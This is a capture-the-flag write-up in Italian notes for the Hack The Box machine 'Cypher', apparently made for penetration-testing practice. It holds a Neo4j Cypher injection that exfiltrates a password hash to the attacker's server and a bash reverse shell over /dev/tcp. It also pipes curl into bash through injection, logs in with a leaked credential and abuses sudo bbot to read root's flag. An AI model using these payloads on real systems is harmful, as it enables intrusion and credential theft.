# Cypher

IP: 10.10.11.57

<!-- https://www.hyhforever.top/htb-cypher/ -->

# NMAP

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-19 20:43 CEST
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 20:44 (0:00:06 remaining)
Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.30% done; ETC: 20:44 (0:00:00 remaining)
Nmap scan report for 10.10.11.57
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
**22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)**
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
**80/tcp open  http    nginx 1.24.0 (Ubuntu)**
|_http-title: Did not follow redirect to http://cypher.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/19%OT=22%CT=1%CU=40423%PV=Y%DS=2%DC=I%G=Y%TM=682B
OS:7C1E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)SEQ(S
OS:P=106%GCD=1%ISR=10A%TI=Z%CI=Z%TS=C)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II
OS:=I)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=7)OPS(O1=M542ST11NW7%O2=M5
OS:42ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11NW7%O6=M542ST11)WIN(
OS:W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0
OS:%O=M542NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=O%F=AS%RD=0%Q=)T1(R=Y%DF=Y%
OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.08 seconds

# Fuzzing

> ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt  -H "Host: FUZZ.cypher.thm" -u http://10.10.11.57

Ci avrebbe messo ore:

> dirsearch -u cypher.htb -t 50 -x 404

output:
```
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/carromano/My_ETH_Tool_list/HTB/VPN's Configurations/reports/_cypher.htb/_25-05-19_20-53-53.txt

Target: http://cypher.htb/

[20:53:54] Starting: 
[20:54:18] 200 -    5KB - /about
[20:54:18] 200 -    5KB - /about.html
[20:54:44] 307 -    0B  - /api  ->  /api/docs
[20:54:44] 307 -    0B  - /api/  ->  http://cypher.htb/api/api
[20:55:05] 307 -    0B  - /demo  ->  /login
[20:55:06] 307 -    0B  - /demo/  ->  http://cypher.htb/api/demo
[20:55:32] 200 -    4KB - /login.html
[20:55:32] 200 -    4KB - /login
[20:56:26] 301 -  178B  - /testing  ->  http://cypher.htb/testing/

Task Completed

```

# Exploit

scrivo uno script per fare delle GET ad ognuna di queste pagine e stamparmi il risultato in dei file txt.

Faccio la stessa cosa con OPTIONS -> non serve a nulla

Leggendo nei vari codici scopro che username e pass sono salvati in neo4j -> VULNERABILE 

inoltre, navigando a /testing riesco a scaricare qualcosa -> un jar

Capisco di avere neo4j -> cerco online script per exploitare la Cypher injection

1. apro un server python in locale sulla 80
2. mando la seguente stringa: `admin' OR 1=1 LOAD CSV FROM 'http://10.10.16.25/ppp='+h.value AS y Return ''//` come username su burp, password arbitraria.

'''
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.57 - - [23/May/2025 10:43:37] code 404, message File not found
10.10.11.57 - - [23/May/2025 10:43:37] "GET /ppp=9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1" 404 -
'''
Quindi ho questo hash: 9f54ca4c130be6d529a56dee59dc2b2090e43acf

uso questo hash per far fare una syscall al sistema ([link](https://www.hyhforever.top/htb-cypher/)):

1. creo il file shell.sh
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.25/9999 0>&1
```
2. hosto il python.http server dalla cartella della shell
3. apro nc in ascolto sulla porta 9999
4. mando la stringa dell'injection

username: `admin' return h.value AS value  UNION CALL custom.getUrlStatusCode(\"127.0.0.1;curl 10.10.16.235/shell.sh|bash;\") YIELD statusCode AS value  RETURN value ; //`

5. uso la shell da nc

user.txt non è leggibile, ma c'è un file che stampato restituisce:

```
neo4j@cypher:/home/graphasm$ cat bbot_preset.yml

targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK

```


mi connetto in SSH a Graphasm:


> ssh graphasm@cypher.htb

> password: cU4btyib.20xtCMCXkBmerhK


# USER FLAG

02d95f8d211e581188c5dbeb6a3620ac

# PRIVESC
```
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

guardando le impostazioni di bbot provo a caricare il file della flag come configurazione per poi stampare in debug

> sudo /usr/local/bin/bbot -cy /root/root.txt --debug

## ROOT FLAG
0435e5951e95f8fc5716fe0f5261163f